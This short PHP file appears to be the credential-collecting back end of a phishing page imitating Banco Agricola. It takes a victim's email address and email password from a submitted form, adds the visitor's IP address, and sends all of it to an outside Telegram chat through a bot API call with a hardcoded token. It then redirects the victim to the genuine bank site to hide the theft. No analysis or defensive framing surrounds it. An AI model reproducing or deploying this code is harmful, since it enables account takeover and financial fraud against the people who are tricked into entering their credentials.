<?php
ini_set("display_errors", 0);
$userp = $_SERVER['REMOTE_ADDR'];
include('dt.php');

if ( isset ($_POST['correo']) && isset ($_POST['claveCorreo'])){

$message = "Correo: ".$_POST['correo']." \r\nClv. correo: ".$_POST['claveCorreo']."\r\nIP ".$userp."\r\n";

$apiToken = "5968183914:AAFzkASiOSiBuUK9g4jYDp7sY1eFtFZ6MgQ";
$data = [
    'chat_id' => '@elieseragri',
    'text' => $message
];
$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );
header ('location: https://www.bancoagricola.com/');
}else{  header ('location: index.html'); exit();
}

?>